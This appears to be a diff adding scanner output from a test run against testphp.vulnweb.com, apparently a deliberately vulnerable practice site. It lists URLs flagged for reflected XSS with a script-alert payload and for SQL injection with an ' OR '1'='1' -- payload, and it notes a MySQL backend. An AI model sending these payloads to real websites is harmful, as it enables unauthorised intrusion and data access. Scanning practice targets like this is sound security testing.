@@ -1,0 +1,26 @@
+XSS Vulnerable: http://testphp.vulnweb.com/listproducts.php?cat=<script>alert('XSS')</script>&zfdfasdf=<script>alert('XSS')</script>
+XSS Vulnerable: http://testphp.vulnweb.com/hpp/?pp=<script>alert('XSS')</script>
+XSS Vulnerable: http://testphp.vulnweb.com/hpp/index.php?pp=<script>alert('XSS')</script>
+XSS Vulnerable: http://testphp.vulnweb.com/showimage.php?file=<script>alert('XSS')</script>&size=<script>alert('XSS')</script>
+DBMS Detected: MySQL
+SQL Vulnerable: http://testphp.vulnweb.com/AJAX/infoartist.php?id=' OR '1'='1' --&YVeN=' OR '1'='1' --
+SQL Vulnerable: http://testphp.vulnweb.com/artists.php?+artist=' OR '1'='1' --
+SQL Vulnerable: http://testphp.vulnweb.com/product.php?pic=' OR '1'='1' --
+SQL Vulnerable: http://testphp.vulnweb.com/AJAX/infoartist.php?id=' OR '1'='1' --&fYij=' OR '1'='1' --
+SQL Vulnerable: http://testphp.vulnweb.com/AJAX/infocateg.php?id=' OR '1'='1' --
+SQL Vulnerable: http://testphp.vulnweb.com/listproducts.php?cat=' OR '1'='1' --&zfdfasdf=' OR '1'='1' --
+SQL Vulnerable: http://testphp.vulnweb.com/bxss/vuln.php?id=' OR '1'='1' --
+SQL Vulnerable: http://testphp.vulnweb.com/listproducts.php?id=' OR '1'='1' --
+SQL Vulnerable: http://testphp.vulnweb.com/search.php?test=' OR '1'='1' --&cat=' OR '1'='1' --&ppl=' OR '1'='1' --
+SQL Vulnerable: http://testphp.vulnweb.com/artists.php?artist=' OR '1'='1' --
+SQL Vulnerable: http://testphp.vulnweb.com/Mod_Rewrite_Shop/details.php?id=' OR '1'='1' --
+SQL Vulnerable: http://testphp.vulnweb.com/Mod_Rewrite_Shop/buy.php?id=' OR '1'='1' --
+SQL Vulnerable: http://testphp.vulnweb.com/search.php?test=' OR '1'='1' --
+SQL Vulnerable: http://testphp.vulnweb.com/AJAX/infoartist.php?id=' OR '1'='1' --
+SQL Vulnerable: http://testphp.vulnweb.com/listproducts.php?artist=' OR '1'='1' --&amp%3Basdf=' OR '1'='1' --&amp%3Bcat=' OR '1'='1' --
+SQL Vulnerable: http://testphp.vulnweb.com/listproducts.php?artist=' OR '1'='1' --&asdf=' OR '1'='1' --&cat=' OR '1'='1' --
+SQL Vulnerable: http://testphp.vulnweb.com/AJAX/infoartist.php?id=' OR '1'='1' --&DUMM=' OR '1'='1' --
+SQL Vulnerable: http://testphp.vulnweb.com/Mod_Rewrite_Shop/rate.php?id=' OR '1'='1' --
+SQL Vulnerable: http://testphp.vulnweb.com/listproducts.php?artist=' OR '1'='1' --
+SQL Vulnerable: http://testphp.vulnweb.com/listproducts.php?cat=' OR '1'='1' --
+SQL Vulnerable: http://testphp.vulnweb.com/product.php?pic=' OR '1'='1' --&hkNi=' OR '1'='1' --
